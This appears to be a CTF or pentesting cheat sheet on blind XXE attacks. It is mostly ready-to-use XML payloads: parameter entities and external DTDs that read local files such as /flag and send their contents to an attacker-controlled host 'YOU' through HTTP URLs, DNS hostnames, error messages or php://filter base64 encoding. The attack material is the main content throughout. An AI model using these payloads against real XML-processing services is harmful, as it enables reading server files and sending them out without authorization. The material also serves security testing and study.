# Blind XXE — when nothing echoes back

## The channel matrix — pick by what's available

| Channel | Requirements | Form |
|---|---|---|
| error | parser error reflects text | error-based exfil |
| OOB HTTP | egress allowed | parameter-entity DTD |
| OOB DNS | DNS egress only | entity → `file://` → DNS-name URL |
| response-body indirect | the entity lands in a later page | second-order |
| timing | none of the above | billion-laughs-style delay? mostly no |

## The parameter-entity + external-DTD pattern — the workhorse

Target doc:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % dtd SYSTEM "http://YOU/evil.dtd">
  %dtd;
]>
<r>&exfil;</r>
```

Your `evil.dtd` (hosted on your listener):

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://YOU/?d=%file;'>">
%eval;
```

The parser fetches `evil.dtd`, builds `&exfil;` containing the file
contents URL-encoded inside the URL, then fetches it → your log gets
the file.

## Why a second DTD instead of inline param entities?

XML spec forbids parameter-entity expansion *inside* entity values in
the INTERNAL subset — `<!ENTITY % eval "<!ENTITY ...>">` used inline
must reference an EXTERNAL subset to work in strict parsers. The
two-file trick (internal `%dtd;` pulling an external DTD) sidesteps it.

## The standalone=`'no'` + external DTD variant

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE r SYSTEM "http://YOU/evil.dtd">
<r>&x;</r>
```

External subset declared directly — the whole DTD lives on your host —
simplest two-file shape.

## The error-based variant — no outbound needed

If the parser's error message lands in the response (verbose errors
on), coerce the file content into an error:

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
&err;
```

Parser tries to fetch `file:///nonexistent/<flag-content>` → error
names the path = the flag — `error-based.md`.

## OOB without an external host — DNS-only exfil

No HTTP listener? Use the entity URL's HOSTNAME — the parser resolves
it → DNS query to your resolver:

```xml
<!ENTITY x SYSTEM "http://%file;.YOU.com/">
<!ENTITY % d SYSTEM "http://exfil.YOU.com/">
```

Wildcard DNS on your domain logs the queried name = the exfil channel.
`file:///` content can't go in a hostname directly — hex/base64 it via
a nested entity composition in the external DTD.

## The in-DTD exfil composition table

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % enc "<!ENTITY exfil SYSTEM 'http://YOU/?d=%file;'>">
%enc;
```

— `%enc;` expands to the declaration of `&exfil;` with `%file;` inside
the URL → `&exfil;` in the body fetches `http://YOU/?d=<file-content>`.

Variants for embedding in the path instead of the query:

```xml
<!ENTITY % enc "<!ENTITY exfil SYSTEM 'http://YOU/%file;/'>">
<!ENTITY % enc "<!ENTITY exfil SYSTEM 'http://x.%file;.YOU/'>">
```

URL-hostname embedding needs the content to be DNS-safe — hex it via a
two-stage external DTD or use `php://filter/convert.base64-encode`.

## The "no egress at all" — in-band-only paths

- error channel if errors echo
- response-side channels — if the field echoes into a later page
  (profile, PDF preview, email) — second-order in-band
- `php://filter` base64 inside an echoed field — in-band read, no OOB
- `xinclude.md` — XInclude reads without DOCTYPE at all

## The two-hop exfil — stage the file into a URL-safe form

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % enc "<!ENTITY exfil SYSTEM 'http://YOU/?d=%file;'>">
```

`php://filter` base64-wraps the content so the URL is always legal —
the standard PHP-side exfil amplifier.

## Falsifiers

- no echo, no error channel, no egress → XXE unexploitable for exfil
  (entity resolution may still be ON — record it as a read-attempt
  finding only if a file actually resolves in-band)
